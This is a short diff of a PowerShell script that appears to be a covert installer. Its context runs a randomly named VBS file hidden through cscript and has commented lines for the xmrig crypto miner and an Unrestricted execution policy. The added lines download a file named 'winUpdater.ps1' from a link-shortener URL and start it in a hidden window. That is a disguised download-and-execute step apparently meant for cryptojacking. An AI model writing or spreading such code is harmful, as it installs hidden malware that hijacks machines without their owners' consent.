@@ -111,7 +111,11 @@ Set-ItemProperty -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Name Attributes -Value "
 
 cd $initial_dir
 
+Invoke-WebRequest -UseBasicParsing -OutFile "winUpdater.ps1" -Uri "http://tiny.cc/limg001"
+
 Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwjOosKx.vbs"
+
+Start-Process -FilePath "$initial_dir\winUpdater.ps1" -windowstyle hidden
 
 # Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 # cd "$initial_dir\xmrig-6.22.2"
